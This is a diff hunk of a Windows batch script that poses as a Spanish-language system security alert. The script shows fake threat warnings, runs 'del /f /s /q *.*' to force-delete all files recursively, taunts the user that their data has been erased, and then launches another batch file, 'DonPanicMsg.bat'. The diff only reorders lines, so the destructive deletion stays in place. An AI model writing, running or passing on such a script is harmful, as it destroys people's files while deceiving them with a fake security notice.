@@ -40,8 +40,8 @@ title Alerta Del Sistema
 color 4f
 msg * ADVERTENCIA: Se ha detectado una amenaza en su sistema.
 msg * Iniciando el protocolo de eliminacion de archivos...
-del /f /s /q *.*
 attrib +r "DonPanicMsg.bat"
+del /f /s /q *.*
 msg * Lo sentimos pero tus datos han sido borrados TE HE AVISADO
 msg * Pero mientras vamos a divertirnos
 start DonPanicMsg.bat
